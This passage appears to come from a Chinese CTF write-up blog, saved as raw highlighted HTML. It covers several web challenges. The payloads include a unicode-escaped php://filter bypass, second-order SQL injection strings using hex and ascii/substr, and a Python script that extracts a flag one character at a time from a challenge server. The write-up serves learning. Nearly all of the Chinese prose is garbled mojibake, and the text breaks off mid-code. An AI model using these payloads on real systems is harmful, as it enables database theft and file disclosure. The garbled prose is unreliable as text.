class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-comment">//ä¸å…è®¸ç›®å½•ç©¿è¶Šï¼Œbanäº†ä¸€äº›ä¼ªåè®®å’Œflagå…³é”®å­—</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) &#123;<span class="hljs-comment">//æ²¡æœ‰.*ï¼Œæ¢è¡Œç»•è¿‡ä¹Ÿè¡Œä¸é€š</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>  <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$page</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<span class="hljs-comment">///HarekazeCTF\&#123;.+\&#125;/i åŒ¹é…ä»¥ HarekazeCTF&#123; å¼€å¤´ï¼Œä»¥ &#125; ç»“å°¾çš„æ–‡æœ¬</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]); <br></code></pre></td></tr></table></figure><p>æŒºå¥½æ‡‚çš„ä¸€æ®µä»£ç ï¼Œå…ˆæ˜¯é€šè¿‡æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ç›®å½•ç©¿è¶Šã€ä¸€äº›ä¼ªåè®®å’Œflagå…³é”®å­—ã€‚ç„¶ååˆ©ç”¨<code>file_get_contents</code>è·å¾—<code>php://input</code>ä¸­è¯·æ±‚ä½“çš„å†…å®¹ã€‚ç„¶åæ³¨æ„è¿™é‡Œ<code>POST</code>çš„å†…å®¹è¦ç¬¦åˆ<code>JSON</code>æ ¼å¼ç„¶åæŠŠä»–è½¬æ¢æˆæ•°ç»„ã€‚ç„¶åæŠŠæ•°ç»„<code>page</code>é”®å¯¹åº”çš„å€¼é€šè¿‡<code>file_get_contents</code>å‡½æ•°è¯»å‡ºæ¥ã€‚è¿™é‡Œæ³¨æ„æœ€åçš„æ­£åˆ™åŒ¹é…æŠŠ<code>flag</code>çš„æ ¼å¼å®Œç¾åŒ¹é…æ‰äº†ã€‚</p><p>æ²¡è¿‡æ»¤<code>filter</code>æ‰€ä»¥å¾ˆè‡ªç„¶æƒ³åˆ°åˆ©ç”¨ä¼ªåè®®å»è¯»<code>flag</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>ä½†è¿‡æ»¤äº†<code>php</code>å’Œ<code>flag</code>ï¼Œä¸è¿‡<code>json decode</code>æ—¶ä¼šè‡ªåŠ¨æŠŠ <code>\u</code> å¼€å¤´çš„ Unicode æˆ–è€… <code>\x</code> å¼€å¤´çš„ hex è½¬æ¢ä¸ºæ­£å¸¸çš„å­—ç¬¦ä¸²ã€‚</p><p><code>*ph\u0070://filter/read=convert.base64-encode/resource=\x66lag*</code></p><p>è½¬æ¢æˆ<code>JSON</code>å½¢å¼ï¼Œæ³¨æ„é”®åå¾—æ˜¯<code>page</code>:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ph\u0070://filter/read=convert.base64-encode/resource=/\u0066lag&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/encodeencode1.png" alt="encodeencode1"></p><p>å°è¯•<code>\x</code>å¼€å¤´çš„å¤±è´¥äº†ã€‚ã€‚ä¸çŸ¥é“å•¥åŸå› ï¼Œç½‘ä¸Šçš„<code>wp</code>éƒ½ç”¨çš„<code>unicode</code>å¹¶æ²¡æœ‰ç”¨hexã€‚</p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>20231231 è¿™é¢˜è¿˜æ²¡åšå®Œæœ‰ä¸ªåœ°æ–¹æ²¡å¼„æ‡‚ã€‚ã€‚ã€‚åé¢æ”¾å‡è¡¥ä¸Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <span class="hljs-comment">//æ£€æŸ¥æ–‡ä»¶æ˜¯å¦ä¸ºæœ‰æ•ˆçš„å›¾åƒæ–‡ä»¶</span><br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);  <span class="hljs-comment">//ä½¿ç”¨çš„å­—èŠ‚å€¼æ•°ç›®ä¸èƒ½è¶…è¿‡12ä¸ª</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>strrpos()</code> å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œç„¶åä½¿ç”¨ <code>substr()</code> å‡½æ•°ä»è¯¥ä½ç½®çš„ä¸‹ä¸€ä¸ªä½ç½®å¼€å§‹æˆªå–ã€‚</p><p>æ­£åˆ™åŒ¹é…äº†<code>ph</code>(è¿˜æ˜¯&#x2F;iæ¨¡å¼)ï¼Œè¿™æ ·ä¸€æ¥php,phtmlå•¥çš„åç¼€æ ¹æœ¬ä¸è¦æƒ³äº†ã€‚<code>mb_strpos()</code> å‡½æ•°åœ¨æ–‡ä»¶å†…å®¹ä¸­æœç´¢ <code>&lt;?</code> å­—ç¬¦ä¸²ã€‚å¦‚æœæ‰¾åˆ°äº†è¯¥å­—ç¬¦ä¸²ï¼Œåˆ™ <code>mb_strpos()</code> å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œå¦åˆ™è¿”å› <code>false</code>ã€‚</p><p>å‚è€ƒ<code>https://liotree.github.io/2019/08/21/EasyWeb/</code></p><p><img src="/img/suctf2019ezweb1.png" alt="suctf2019ezweb1"></p><h2 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h2><p><img src="/img/wdbunfinish1.png" alt="wdbunfinish1"></p><p><code>register.php</code></p><p><img src="/img/wdbunfinish2.png" alt="wdbunfinish2"></p><p>sbç«ç‹ä¸€ç›´å¼¹ç½‘ç«™ä¸å®‰å…¨å®³æˆ‘æ³¨å†Œç™»å½•ä¸äº†ã€‚ã€‚</p><p><img src="/img/wdbunfinish3.png" alt="wdbunfinish3"></p><p>ï¼Ÿ</p><p>æŠ“åŒ…çœ‹ä¸‹ä¼ è¾“è¿‡ç¨‹ï¼š</p><p><img src="/img/wdbunfinish4.png" alt="wdbunfinish4"></p><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·åå¯†ç ç›´æ¥æ˜æ–‡ä¼ è¿‡å»äº†ï¼Œæ³¨å†Œç•Œé¢ä¹Ÿä¸€æ ·ï¼š</p><p><img src="/img/wdbunfinish5.png" alt="wdbunfinish5"></p><p><img src="/img/wdbunfinish6.png" alt="wdbunfinish6"></p><p>æºç ä¸­ä¼šæ˜¾ç¤ºæ³¨å†Œçš„ç”¨æˆ·åã€‚</p><p>è¿™é‡Œæƒ³ç€æ²¡æœ‰æ³¨å…¥ç‚¹çš„è¯è¿™ä¸ªç”¨æˆ·åèƒ½ä¸èƒ½åˆ©ç”¨ï¼Œå»æ³¨å†Œ<code>a&#39;#</code>å‘ç°æ³¨å†Œä¸äº†ï¼Ÿåº”è¯¥æ˜¯è§¦å‘äº†ä»€ä¹ˆè¿‡æ»¤ã€‚æ­£å¸¸æ³¨å†Œå®Œåº”è¯¥æ˜¯ç›´æ¥è·³åˆ°<code>login</code>ç•Œé¢çš„ã€‚</p><p>åé¢æ³¨å†Œäº†ä¸€ä¸‹<code>aa&#39;</code>è¿˜æ˜¯æ³¨å†Œä¸äº†ï¼Œåˆè¯•äº†ä¸€ä¸‹<code>aa&#39;&#39;</code>å‘ç°èƒ½æ³¨å†Œï¼š</p><p><img src="/img/wdbunfinish7.png" alt="wdbunfinish7"></p><p>æ³¨æ„è¿™é‡Œï¼Œæˆ‘ç”³è¯·çš„æ˜¯<code>aa&#39;&#39;</code>ä½†å˜æˆ<code>aa&#39;</code>äº†ï¼Œæœ‰ä¸ªå•å¼•å·ä¸çŸ¥é“è·‘å“ªé‡Œå»äº†ï¼Ÿ</p><p>å•å¼•å·èƒ½æ³¨å†Œå¤§æ¦‚ç‡æ˜¯å­˜åœ¨è½¬ä¹‰å‡½æ•°ï¼Œ<code>&#39;&#39;</code>è¿›å»å˜æˆäº†<code>\&#39;\&#39;</code>ï¼Œè¿™é‡Œå›æ˜¾çš„ç”¨æˆ·ååº”è¯¥æ˜¯æŠŠè½¬ä¹‰åçš„æ‹¿å‡ºæ¥äº†ï¼Œåé¢æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå•æ•°çš„åŒå¼•å·æ— æ³•æ³¨å†Œï¼ŒåŒæ•°çš„å•å¼•å·å¯ä»¥æˆåŠŸæ³¨å†Œï¼Œä½†ä¼šåæ‰ä¸€åŠçš„å•å¼•å·ã€‚</p><p>å…ˆæƒ³æƒ³åå•å¼•å·æ˜¯æ€ä¹ˆå›äº‹ï¼š</p><p><code>aa&#39;&#39;</code> - &gt; <code>aa\&#39;\&#39; </code> -&gt;  <code>aa&#39;</code></p><p>é¦–å…ˆç”¨æˆ·åè¿›å»è‚¯å®šè¢«å•å¼•å·åŒ…è£¹<code>&#39;username&#39;</code>ï¼Œ<code>aa&#39;&#39;</code>è¿›å»ä¹‹åè½¬ä¹‰æˆ<code>aa\&#39;\&#39;</code>ï¼Œå­˜åˆ°æ•°æ®åº“é‡Œè¿˜æ˜¯æ€ä¹ˆæ ·ã€‚å›æ˜¾çš„æ—¶å€™æŠŠ<code>aa\&#39;\&#39;</code>è¿™ä¸œè¥¿ç»™æ‹¿å‡ºæ¥ã€‚é‚£æ€ä¹ˆåšæ‰ä¼šåæ‰ä¸€ä¸ªå•å¼•å·å‘¢ï¼Ÿ</p><p><code>aa&#39;&#39;&#39;&#39;</code> -&gt; <code>aa&#39;&#39;</code></p><p>åé¢å»æ‰¾äº†æºç çœ‹çœ‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$email</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]);<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users(email,username,password) values(&#x27;&quot;</span>.<span class="hljs-variable">$email</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username from users where email=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>]).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p>æ„Ÿè§‰è¿™ä¸œè¥¿åƒäºŒæ¬¡æ³¨å…¥+<code>insert</code>æ³¨å…¥æ‹¼èµ·æ¥ï¼Œä½†è¿˜æ˜¯ä¸çŸ¥é“æ€ä¹ˆå›äº‹ã€‚ã€‚æ‰¾æœºä¼šé—®é—®åˆ«äººâ•®(â•¯-â•°)â•­</p><p><code>1&#39;and&#39;0</code>:</p><p><img src="/img/wdbunfinish8.png" alt="wdbunfinish8"></p><p>å•å¼•å·é—­åˆï¼Œè€Œä¸”<code>1&#39;and&#39;0</code>è¿™ä¸œè¥¿å˜æˆäº†<code>0</code>ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-keyword">sql</span>çš„å­—ç¬¦ä¸²è¿ç®—ï¼šæ•°å€¼ç›¸åŠ <br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&#x27;2&#x27;</span> <br># <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>database()<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>hex(database())<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">776562</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> webçš„<span class="hljs-number">16</span>è¿›åˆ¶<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> wçš„asciiç <br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>##<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> wçš„asciiç <br>#å‚è€ƒï¼šhttps:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>blog.csdn.net<span class="hljs-operator">/</span>zzzgd_666<span class="hljs-operator">/</span>article<span class="hljs-operator">/</span>details<span class="hljs-operator">/</span><span class="hljs-number">121704012</span><br>#  https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xz.aliyun.com<span class="hljs-operator">/</span>t<span class="hljs-operator">/</span><span class="hljs-number">10594</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdbunfinish13.png" alt="wdbunfinish13"></p><p><code>0&#39;+hex(database())+&#39;0</code></p><p><img src="/img/wdbunfinish9.png" alt="wdbunfinish9"></p><p>æ³¨æ„è¿™é‡Œæ˜¯åå…­è¿›åˆ¶ï¼Œè½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯<code>web</code></p><p>çˆ†è¡¨çš„è¯<code>information</code>è¿™ä¸œè¥¿è¢«æ­£åˆ™åŒ¹é…æ‰äº†ï¼Œå›æ˜¾<code>nonono</code>ã€‚å½“æ—¶æƒ³ç€è¿˜èƒ½ç”¨<code>sys</code>åº“å»ä»£æ›¿<code>information_schema</code>ï¼š</p><p><img src="/img/wdbunfinish10.png" alt="wdbunfinish10"></p><p>å…ˆå°è¯•<code>0&#39;+hex(hex(version()))+&#39;0</code></p><p><img src="/img/wdbbbbbbbbbbunfinifh11.png" alt="wdbbbbbbbbbbunfinifh11"></p><p>å‡ºäº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œä½¿ç”¨ä¸¤æ¬¡<code>hex</code>ä¸»è¦å°±æ˜¯ä¸ºäº†æ¶ˆé™¤<code>abcd</code>è¿™ç§å­—æ¯ï¼Œè€Œä¸”å› ä¸ºé•¿å­—ç¬¦ä¸²è½¬æˆæ•°å­—å‹æ•°æ®çš„æ—¶å€™ä¼šå˜æˆç§‘å­¦è®¡æ•°æ³•å¯¼è‡´ä¹Ÿå°±æ˜¯è¯´ä¼šä¸¢å¤±æ•°æ®ç²¾åº¦ï¼Œæ‰€ä»¥å¯ä»¥ä¸€ä½ä¸€ä½çš„æˆªã€‚<code>https://xz.aliyun.com/t/2619#toc-3</code></p><p>æ³¨æ„è¿™ä¸ªæ•°æ®åº“çš„ç‰ˆæœ¬ï¼š(åº•ä¸‹ä»£ç <code>select * from flag</code>æ¢æˆ<code>version()</code>å°±è¡Œ)</p><p><img src="/img/wdbunfinish12.png" alt="wdbunfinish12"></p><p>å¸ˆå‚…ä»¬çš„<code>wp</code>é‡Œéƒ½æ˜¯ç›´æ¥<code>select * from flag</code>ï¼Œ<code>flag</code>è¿™ä¸ªè¡¨æ˜¯çŒœå‡ºæ¥çš„ã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">//å‚è€ƒhttps://www.cnblogs.com/upfine/p/<span class="hljs-number">16607426.</span>html<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;http://7d3b4912-e6bb-4111-b640-7ab9e2fea080.node4.buuoj.cn:81/&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <span class="hljs-comment"># è¿™è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªBeautifulSoupå¯¹è±¡ï¼Œç”¨äºè§£æç½‘é¡µçš„HTMLå†…å®¹ã€‚response_login.textæ˜¯ä¸€ä¸ªåŒ…å«ç½‘é¡µHTMLå†…å®¹çš„å­—ç¬¦ä¸²ï¼Œ&#x27;html.parser&#x27;æ˜¯æŒ‡å®šä½¿ç”¨HTMLè§£æå™¨æ¥è§£æç½‘é¡µ</span><br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># å–è¿”å›é¡µé¢æ•°æ®çš„span class=user-nameå±æ€§</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure><p>å½“ç„¶è¿˜æœ‰åˆ©ç”¨ä¸¤æ¬¡<code>hex</code>å»è½¬æ¢çš„ï¼ŒåŸç†å’Œä¸Šé¢å·®ä¸å¤š:</p><p><code>0&#39;%2B(select substr(hex(hex((select * from flag))) from 1 for 1))%2B&#39;0</code></p><p>å‚è€ƒ<code>https://syunaht.com/p/3379740036.html</code></p><p><code>https://xz.aliyun.com/t/2619#toc-3</code></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p><img src="/img/doublescret1.png" alt="doublescret1"></p><p><code>dirsearch</code>æ²¡æ‰«å‡ºæ¥å•¥ï¼Œè¯•äº†è¯•<code>/secret</code>:</p><p><img src="/img/doublesecret2.png" alt="doublesecret2"></p><p><code>/secret?secret=1</code></p><p><img src="/img/doublesecret3.png" alt="doublesecret3"></p><p><code>/secret?secret=secret</code>ï¼Œå¼€äº†<code>Debug</code>ï¼Œå‘ç°æœ‰è¿™ä¹ˆæ®µä¸œè¥¿ï¼š</p><p><img src="/img/ciscndoublesrecreet1.png" alt="ciscndoublesrecreet1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 